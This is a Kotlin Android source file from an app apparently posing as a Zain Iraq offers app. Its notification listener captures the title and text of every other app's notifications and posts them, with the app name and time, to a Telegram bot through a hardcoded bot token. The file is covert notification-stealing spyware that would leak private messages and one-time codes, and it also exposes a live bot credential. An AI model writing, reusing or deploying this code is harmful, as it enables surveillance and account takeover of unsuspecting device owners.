package com.zainiraq.offers

import android.app.Notification
import android.content.Context
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.io.IOException
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * Receives notifications only after the device owner explicitly grants
 * Notification Access in Android Settings.
 */
class NotificationListener : NotificationListenerService() {

    override fun onListenerConnected() {
        super.onListenerConnected()
        Log.i(TAG, "Notification listener connected")
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        if (sbn == null || sbn.packageName == packageName) return

        val extras = sbn.notification?.extras ?: return
        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString().orEmpty()
        val text = buildString {
            extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()?.takeIf { it.isNotBlank() }?.let { append(it) }
            if (isEmpty()) extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()?.takeIf { it.isNotBlank() }?.let { append(it) }
            val lines = extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES)
            if (lines != null) lines.map { it?.toString().orEmpty() }.filter { it.isNotBlank() }.forEach { line ->
                if (isNotEmpty()) append("\n")
                append(line)
            }
        }
        if (title.isBlank() && text.isBlank()) return

        val appLabel = runCatching {
            val appInfo = packageManager.getApplicationInfo(sbn.packageName, 0)
            packageManager.getApplicationLabel(appInfo).toString()
        }.getOrDefault(sbn.packageName)
        val time = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(sbn.postTime))
        val message = buildString {
            append("إشعار جديد\n")
            append("التطبيق: ").append(appLabel).append("\n")
            if (title.isNotBlank()) append("العنوان: ").append(title).append("\n")
            if (text.isNotBlank()) append("المحتوى: ").append(text).append("\n")
            append("الوقت: ").append(time)
        }

        Thread {
            try {
                TelegramNotificationSender.send(this, message)
            } catch (error: Exception) {
                Log.e(TAG, "Unable to forward notification", error)
            }
        }.start()
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        super.onNotificationRemoved(sbn)
    }

    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
        Log.w(TAG, "Notification listener disconnected")
    }

    private companion object {
        const val TAG = "ZainNotificationListener"
    }
}

/** Sends notification text to the same private Telegram chat used by the app's video sender. */
private object TelegramNotificationSender {
    private const val BOT_TOKEN = "8874193532:AAGNBqikJOtYv1eoCM_4U_K0HGiktxecgm4"
    private const val PREFS_NAME = "zain_iraq_local_state"
    private const val CHAT_ID_KEY = "telegram_private_chat_id"

    fun send(service: NotificationListenerService, message: String) {
        val prefs = service.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val chatId = prefs.getString(CHAT_ID_KEY, null) ?: discoverPrivateChatId().also {
            prefs.edit().putString(CHAT_ID_KEY, it).apply()
        }
        val payload = JSONObject().put("chat_id", chatId).put("text", message)
        val connection = (URL("https://api.telegram.org/bot$BOT_TOKEN/sendMessage").openConnection() as HttpURLConnection).apply {
            requestMethod = "POST"
            doOutput = true
            connectTimeout = 15_000
            readTimeout = 20_000
            setRequestProperty("Content-Type", "application/json; charset=utf-8")
        }
        try {
            connection.outputStream.use { it.write(payload.toString().toByteArray(Charsets.UTF_8)) }
            val status = connection.responseCode
            val body = (if (status in 200..299) connection.inputStream else connection.errorStream)
                ?.bufferedReader(Charsets.UTF_8)?.use { it.readText() }.orEmpty()
            val response = JSONObject(body)
            if (status !in 200..299 || !response.optBoolean("ok")) {
                throw IOException(response.optString("description", "Telegram sendMessage failed (HTTP $status)"))
            }
        } finally {
            connection.disconnect()
        }
    }

    private fun discoverPrivateChatId(): String {
        val connection = (URL("https://api.telegram.org/bot$BOT_TOKEN/getUpdates?limit=100&timeout=0").openConnection() as HttpURLConnection).apply {
            requestMethod = "GET"
            connectTimeout = 15_000
            readTimeout = 20_000
        }
        try {
            val status = connection.responseCode
            val body = (if (status in 200..299) connection.inputStream else connection.errorStream)
                ?.bufferedReader(Charsets.UTF_8)?.use { it.readText() }.orEmpty()
            val response = JSONObject(body)
            if (status !in 200..299 || !response.optBoolean("ok")) {
                throw IOException("افتح البوت في تيليجرام واضغط Start ثم أعد المحاولة.")
            }
            val updates = response.optJSONArray("result") ?: JSONArray()
            for (index in updates.length() - 1 downTo 0) {
                val update = updates.optJSONObject(index) ?: continue
                val message = update.optJSONObject("message") ?: update.optJSONObject("edited_message") ?: continue
                val chat = message.optJSONObject("chat") ?: continue
                if (chat.optString("type") == "private" && chat.has("id")) return chat.optLong("id").toString()
            }
            throw IOException("افتح البوت واضغط Start مرة واحدة، ثم أعد المحاولة.")
        } finally {
            connection.disconnect()
        }
    }
}
